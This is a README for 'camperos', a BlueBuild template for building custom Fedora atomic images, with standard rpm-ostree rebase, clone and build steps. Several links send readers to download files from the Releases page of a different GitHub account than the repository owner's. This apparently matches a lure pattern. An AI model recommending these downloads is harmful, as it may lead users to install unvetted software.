# camperos &nbsp; [![bluebuild build badge](https://github.com/myself4626/camperos/actions/workflows/build.yml/badge.svg)](https://github.com/myself4626/camperos/actions/workflows/build.yml)

Welcome to the **camperos** project! This repository provides a template for building custom images using BlueBuild. If you're looking to set up your own repository based on this template, you can find quick setup instructions in the [BlueBuild docs](https://blue-build.org/how-to/setup/). After setting up, consider updating this README to reflect your custom image.

## Installation

**Important:** This feature is experimental. Please proceed with caution.

To rebase an existing atomic Fedora installation to the latest build, follow these steps:

1. **Rebase to the Unsigned Image:**
   First, you need to rebase to the unsigned image to install the necessary signing keys and policies. Run the following command:

   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/myself4626/camperos:latest
   ```

2. **Reboot the System:**
   After the rebase, reboot your system to complete the process:

   ```bash
   systemctl reboot
   ```

3. **Rebase to the Signed Image:**
   Finally, rebase to the signed image with this command:

   ```bash
   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/myself4626/camperos:latest
   ```

## Getting Started

To get started with camperos, ensure you have the following prerequisites:

- A Fedora system that supports rpm-ostree.
- Basic knowledge of command-line operations.

### Step-by-Step Guide

1. **Clone the Repository:**
   First, clone the camperos repository to your local machine:

   ```bash
   git clone https://github.com/myself4626/camperos.git
   cd camperos
   ```

2. **Build the Image:**
   Follow the instructions in the BlueBuild documentation to build your custom image. This process will guide you through the necessary configurations.

3. **Testing the Image:**
   Once you have built the image, you can test it on your local machine. Ensure that all functionalities work as expected.

4. **Release Your Image:**
   When you are satisfied with your image, consider releasing it. You can find the releases section [here](https://github.com/elenatotaj/camperos/releases).

## Features

- **Atomic Updates:** Enjoy seamless updates without downtime.
- **Immutable Infrastructure:** Create stable and reliable environments.
- **Customizability:** Tailor the image to meet your specific needs.

## Topics

This repository covers several important topics related to Linux and containerization:

- **Atomic:** Emphasizes atomic updates for reliability.
- **BlueBuild:** A tool for building custom images.
- **Custom Image:** Create tailored images for your needs.
- **Immutable:** Focus on stable and unchangeable environments.
- **OCI:** Adheres to Open Container Initiative standards.

## Additional Resources

- For more details on BlueBuild, visit the [official documentation](https://blue-build.org/how-to/setup/).
- Check the "Releases" section for downloadable files and updates. You can access it [here](https://github.com/elenatotaj/camperos/releases).

## Contributing

We welcome contributions to camperos. If you want to help, please follow these steps:

1. **Fork the Repository:** Create your own copy of the repository.
2. **Make Changes:** Implement your features or fixes.
3. **Submit a Pull Request:** Share your changes with the community.

## License

This project is licensed under the MIT License. See the LICENSE file for more details.

## Contact

For any inquiries or issues, feel free to reach out:

- **Email:** your-email@example.com
- **GitHub:** [myself4626](https://github.com/myself4626)

## Acknowledgments

Thanks to the contributors and the community for their support in making camperos a valuable resource.

---

### Final Thoughts

The camperos project aims to provide a robust framework for building custom images on Fedora. By following the guidelines in this README, you can set up, customize, and deploy your own images effectively. Enjoy your journey with camperos!

Feel free to explore the [Releases](https://github.com/elenatotaj/camperos/releases) section for the latest updates and downloads.